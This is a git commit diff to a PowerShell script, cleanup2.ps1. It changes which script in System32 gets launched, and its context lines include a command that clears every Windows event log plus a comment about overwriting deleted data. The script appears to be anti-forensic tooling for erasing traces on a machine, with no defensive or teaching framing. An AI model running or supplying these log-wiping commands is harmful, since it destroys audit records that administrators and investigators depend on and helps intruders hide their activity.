ad1026a3f421503b69bcd8eeb161c2b11be62fcb
Kylerainer09 <Mr.nobodyAl22SU@proton.me>
2025-11-29 10:44:21 +0000

    Update cleanup2.ps1

--- cleanup2.ps1
+++ cleanup2.ps1
@@ -1,5 +1,5 @@
 # starts exitstrategy.ps1
-& "C:\Windows\System32\exitstrategy.ps1"
+& "C:\Windows\System32\cleanup1.ps1"
 # clears event log
 wevtutil el | Foreach-Object {wevtutil cl "$_"}
 # overwrite deleted data
